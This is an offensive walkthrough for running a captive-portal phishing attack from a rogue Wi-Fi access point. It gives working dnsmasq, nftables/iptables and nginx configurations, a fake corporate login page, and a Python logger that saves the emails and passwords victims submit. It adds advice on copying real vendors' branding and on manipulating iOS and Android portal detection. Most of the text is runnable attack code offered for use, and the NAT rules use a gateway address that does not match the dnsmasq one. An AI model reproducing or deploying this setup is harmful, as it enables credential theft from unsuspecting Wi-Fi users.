# Captive portal — walkthrough

**Verified against:** iOS 16+ CNA / Android 11+ ConnectivityService / OpenWRT 23.05 dnsmasq as of 2026-Q3

Stand up the four-layer chain (DHCP → DNS → HTTP → form) on the
Pineapple. Template it to the target vendor. Capture the POST.

## Preconditions

- Open (no WPA) or WPA2-PSK-with-known-PSK rogue AP already up.
  See `evil-twin/walkthrough.md`.
- Root SSH on the Pineapple.

## Step 1 — dnsmasq: DHCP + DNS

```
cat > /etc/dnsmasq.captive.conf <<EOF
interface=wlan1
bind-interfaces
dhcp-range=172.16.42.10,172.16.42.250,255.255.255.0,12h
dhcp-option=3,172.16.42.1               # gateway = us
dhcp-option=6,172.16.42.1               # DNS = us

# Every A record resolves to us.
address=/#/172.16.42.1

# Return a captive-portal API for OSes that ping known probe URLs.
address=/captive.apple.com/172.16.42.1
address=/connectivitycheck.gstatic.com/172.16.42.1
address=/detectportal.firefox.com/172.16.42.1
address=/www.msftconnecttest.com/172.16.42.1
EOF

pkill dnsmasq
dnsmasq -C /etc/dnsmasq.captive.conf
```

## Step 1b — NAT redirect (force DNS + HTTP through us)

Clients that hard-code `8.8.8.8` for DNS, or hard-code an IP for
HTTPS, bypass dnsmasq entirely. Force everything through the portal
box with a prerouting NAT redirect.

### nftables (preferred — Debian/Kali default since Buster)

```
nft add table ip nat
nft add chain ip nat prerouting { type nat hook prerouting priority -100 \; }
nft add chain ip nat postrouting { type nat hook postrouting priority 100 \; }
# All DNS queries -> local dnsmasq
nft add rule ip nat prerouting iifname wlan1 udp dport 53 dnat to 172.16.0.1:53
# All HTTP -> local portal
nft add rule ip nat prerouting iifname wlan1 tcp dport 80 dnat to 172.16.0.1:80
nft add rule ip nat prerouting iifname wlan1 tcp dport 443 dnat to 172.16.0.1:443
# NAT masquerade outbound
nft add rule ip nat postrouting oifname eth0 masquerade
```

### iptables (legacy) — fallback

```
iptables -t nat -A PREROUTING -i wlan1 -p udp --dport 53  -j DNAT --to-destination 172.16.0.1:53
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80  -j DNAT --to-destination 172.16.0.1:80
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 172.16.0.1:443
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Step 2 — nginx or a Python one-liner for HTTP

Minimum viable — every URL redirects to the login form:

```
# /etc/nginx/sites-enabled/captive
server {
    listen 80 default_server;
    server_name _;

    location / {
        return 302 http://172.16.42.1/login;
    }

    location /login {
        root /var/www/captive;
        index index.html;
    }

    location /submit {
        proxy_pass http://127.0.0.1:8000/submit;
    }

    # OS probe URLs — return the "not captive" 204 to a wrong host on purpose:
    # Do NOT return 204 here; return the login page so the OS surfaces the
    # captive portal banner.
    location /generate_204 { return 302 http://172.16.42.1/login; }
    location /hotspot-detect.html { return 302 http://172.16.42.1/login; }
    location /connecttest.txt { return 302 http://172.16.42.1/login; }
}
```

Login form (`/var/www/captive/index.html`):

```html
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>WiFi Sign-in</title>
</head>
<body style="font-family:sans-serif;padding:2em;">
  <h1>CorpWiFi — Sign in to continue</h1>
  <form method="POST" action="/submit">
    <p><label>Email <input name="email"></label></p>
    <p><label>Password <input name="password" type="password"></label></p>
    <button type="submit">Connect</button>
  </form>
</body>
</html>
```

## Step 3 — Credential logger

```python
# /opt/portal-logger.py — port 8000
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import time, json, os

LOG = "/tmp/portal-creds.jsonl"

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        params = parse_qs(body.decode("utf-8", errors="replace"))
        entry = {
            "ts": time.time(),
            "peer": self.client_address[0],
            "ua": self.headers.get("User-Agent", ""),
            "form": {k: v[0] for k, v in params.items()},
        }
        with open(LOG, "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>Connecting...</h1>")

HTTPServer(("127.0.0.1", 8000), H).serve_forever()
```

Run it: `python3 /opt/portal-logger.py &`

## Step 4 — Templating for the target vendor

Match the target's branding — logo, color, "sign in" wording. Real
users are calibrated to visual details; a Comic Sans "Enter Password"
against a black background fools nobody.

- **eaphammer** ships templates for Xfinity, T-Mobile, hotel-brand,
  Starbucks. `eaphammer --templates-list`.
- **wifipumpkin3** has a plugin ecosystem for more.
- Copy the real vendor's HTML from a legitimate capture (curl the
  real portal, save the response, edit the form action).

## Step 5 — Read captured creds

```
tail -F /tmp/portal-creds.jsonl | jq
```

## OS probe-URL specifics

Two modern behaviors matter for whether the OS surfaces the portal
UI at all or silently dismisses it:

- **iOS body-string check** — the Captive Network Assistant fetches
  `http://captive.apple.com/hotspot-detect.html` and looks for the
  literal string `Success` in the body. Anything else — a redirect,
  a login page, a 200 with different content — triggers the CNA UI.
  Serve the login page (not `Success`) on this URL to make iOS pop
  the portal sheet.
- **Android auto-dismiss (Android 11+)** — ConnectivityService
  fetches `http://connectivitycheck.gstatic.com/generate_204`. A
  `204 No Content` reply is treated as "sign-in silently satisfied"
  and any captive-portal UI is auto-dismissed. To *keep* the portal
  UI open, return `302` to your login page (as in Step 2), not
  `204`.

## Failure modes

- **Client OS shows "captive portal" but user ignores it.** Cheap OS
  banners are less compelling than the URL bar. Some Android builds
  auto-open the captive URL in a system webview — that's your friend.
- **HSTS-preloaded domains cannot be bypassed.** Serving a
  self-signed HTTPS cert for e.g. `www.google.com` will not work:
  Chrome, Firefox, and Safari refuse to show a click-through for any
  domain on the HSTS preload list, and as of iOS 16 the Captive
  Network Assistant no longer bypasses HSTS on the user's behalf.
  Serve the portal from a *non-preloaded* domain (an IP literal or
  a fresh domain) and accept that users will see a cert warning
  before clicking through.
- **User sees the cert warning and bails.** Real risk on modern iOS/
  Android. Templates that mimic Wi-Fi Alliance / Passpoint captive
  pages are less flag-raising than a fake "Google login."

## Cite

- IETF RFC 8908 — Captive Portal API (modern OS probe URLs).
- IETF RFC 7710 — Captive-Portal Identification Using DHCP or RA
  (option 114, obsoleted by RFC 8910).
- IETF RFC 8910 — Captive-Portal Identification in DHCP + RA
  (modernized replacement for RFC 7710).
- Hak5 evil-portal module docs.
- attacks.json: `captive-portal-cred-capture`.
